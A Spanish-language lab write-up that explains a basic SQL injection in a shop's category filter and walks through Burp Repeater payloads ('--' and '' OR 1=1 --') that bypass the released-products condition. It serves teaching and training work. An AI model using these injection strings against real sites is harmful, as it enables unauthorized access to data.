# 1. SQLI Básica con WHERE

## 💉 SQL Injection básica en cláusula WHERE

### 📄 Descripción del laboratorio

Este laboratorio es vulnerable a **inyección SQL clásica** en el filtro de productos por categoría.

La aplicación construye dinámicamente una consulta SQL utilizando directamente el valor del parámetro `category`, sin sanitizar la entrada del usuario ni utilizar consultas preparadas.

🎯 **Objetivo del laboratorio:**

* Manipular la consulta SQL
* Mostrar productos no publicados (`released = 0`)
* Alterar la lógica de la cláusula `WHERE`

***

### 📚 Teoría

La aplicación ejecuta internamente una consulta similar a:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

El campo:

```
released = 1
```

actúa como control lógico para mostrar únicamente productos publicados.

El problema es que el valor de `category` proviene directamente del input del usuario y se concatena en la consulta sin validación.

Esto permite:

```
cerrar la cadena SQL
introducir condiciones adicionales
comentar el resto de la consulta
```

Un ataque típico consiste en:

```
OR 1=1
```

Esta condición siempre evalúa a **verdadero**, lo que permite devolver todos los registros.

Además, utilizando comentarios SQL:

```
--
```

podemos eliminar el resto de la consulta original.

***

### 📝 Práctica

#### 1️⃣ Interceptar la petición

Navegamos por la tienda y seleccionamos cualquier categoría, por ejemplo:

```
Gifts
```

Interceptamos la petición enviada al servidor:

```http
GET /filter?category=Gifts
```

La enviamos a **Burp Repeater** para probar distintos payloads.

***

#### 2️⃣ Confirmar la inyección SQL

Probamos introducir una comilla simple:

```
/filter?category='
```

<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

El servidor responde con:

```
error SQL
página en blanco
respuesta anómala
```

Esto indica que la consulta SQL se ha roto.

La consulta resultante sería algo similar a:

```sql
SELECT * FROM products WHERE category = ''' AND released = 1
```

Esto confirma la presencia de **SQL Injection**.

***

#### 3️⃣ Cerrar la cadena y comentar la consulta

Probamos cerrar la cadena y comentar el resto:

```
/filter?category='--
```

La consulta se convierte en:

```sql
SELECT * FROM products WHERE category = ''--' AND released = 1
```

<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

La aplicación responde correctamente, aunque no se muestran productos porque la categoría queda vacía.

***

#### 4️⃣ Bypass completo con OR 1=1

Para eliminar todas las restricciones utilizamos:

```
/filter?category=' OR 1=1 --
```

La consulta final ejecutada por el servidor sería:

```sql
SELECT * FROM products WHERE category = '' OR 1=1 -- ' AND released = 1
```

Explicación:

```
OR 1=1  → condición siempre verdadera
--      → comenta el resto de la consulta
```

Esto elimina el filtro:

```
released = 1
```

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

***

#### 5️⃣ Resultado

La aplicación devuelve **todos los productos de la base de datos**, incluyendo aquellos con:

```
released = 0
```

Esto confirma que la inyección SQL ha sido explotada correctamente.

✅ **Laboratorio resuelto.**
